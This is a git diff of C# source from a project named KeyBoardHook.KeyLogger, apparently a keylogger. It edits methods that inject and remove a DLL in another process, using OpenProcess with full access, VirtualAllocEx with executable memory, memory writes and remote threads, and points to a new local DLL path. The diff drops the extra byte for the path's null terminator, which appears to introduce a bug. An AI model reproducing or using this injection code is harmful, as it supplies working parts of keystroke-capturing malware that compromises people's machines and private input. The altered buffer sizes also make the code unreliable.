@@ -143,7 +143,9 @@ namespace KeyBoardHook.KeyLogger.Service
         }
         
         // string sDllPath = "C:\\Work\\WorkSpace\\c++\\DllMain\\x64\\Release\\DllMain.dll";
-        string sDllPath = "C:\\Users\\voidm\\Desktop\\workspace\\hook\\DllMain.dll";
+        // string sDllPath = "C:\\Users\\voidm\\Desktop\\workspace\\hook\\DllMain.dll";
+
+        private string sDllPath = "C:\\Users\\voidm\\source\\repos\\Dll_dev\\x64\\Release\\Dll_dev.dll";
         public unsafe void unInjectionCDLL(string className, string title)
         {
             var hWnd = NativeMethods.FindWindow(className,title);
@@ -173,7 +175,7 @@ namespace KeyBoardHook.KeyLogger.Service
              {
                  NativeMethods.CloseHandle(snapshot);
              }
-            
+
              var openProcess = NativeMethods.OpenProcess(NativeMethods.PROCESS_ALL_ACCESS, false, threadId);
              if (openProcess.Equals(IntPtr.Zero))
              {
@@ -200,7 +202,7 @@ namespace KeyBoardHook.KeyLogger.Service
             MessageBox.Show($@"unInjectionCDLL remoteThread {remoteThread} successful");
 
             // 释放申请的内存
-            NativeMethods.VirtualFreeEx( openProcess, lpAddress, (IntPtr)sDllPath.Length + 1, NativeMethods.Release );
+            NativeMethods.VirtualFreeEx( openProcess, lpAddress, (IntPtr)sDllPath.Length, NativeMethods.Release );
             
             NativeMethods.CloseHandle(remoteThread);
             NativeMethods.CloseHandle(openProcess);
@@ -230,7 +232,7 @@ namespace KeyBoardHook.KeyLogger.Service
                 }
                     
                 // 在远程进程中为 sDllPath 分配内存
-                lpAddress = NativeMethods.VirtualAllocEx(openProcess, (IntPtr)null, (IntPtr)sDllPath.Length + 1, NativeMethods.Commit, NativeMethods.ExecuteReadWrite);
+                lpAddress = NativeMethods.VirtualAllocEx(openProcess, (IntPtr)null, (IntPtr)sDllPath.Length, NativeMethods.Commit, NativeMethods.ExecuteReadWrite);
 
                 if (lpAddress == IntPtr.Zero)
                 {
@@ -251,8 +253,9 @@ namespace KeyBoardHook.KeyLogger.Service
                 }
                 // float* buffers = stackalloc float[3];
                 IntPtr lpNumberOfBytesWritten;
-                var writeProcessMemory = NativeMethods.WriteProcessMemory(openProcess, lpAddress, buffer, sDllPath.Length + 1, out lpNumberOfBytesWritten);
-                if (writeProcessMemory == 0)
+                Boolean writeBytes = MemUtil.WriteBytes(openProcess,lpAddress,buffer,sDllPath.Length);
+                // var writeProcessMemory = NativeMethods.WriteProcessMemory(openProcess, lpAddress, buffer, sDllPath.Length + 1, out lpNumberOfBytesWritten);
+                if (!writeBytes)
                 {
                     MessageBox.Show("WriteProcessMemory 异常");
                     return;                    
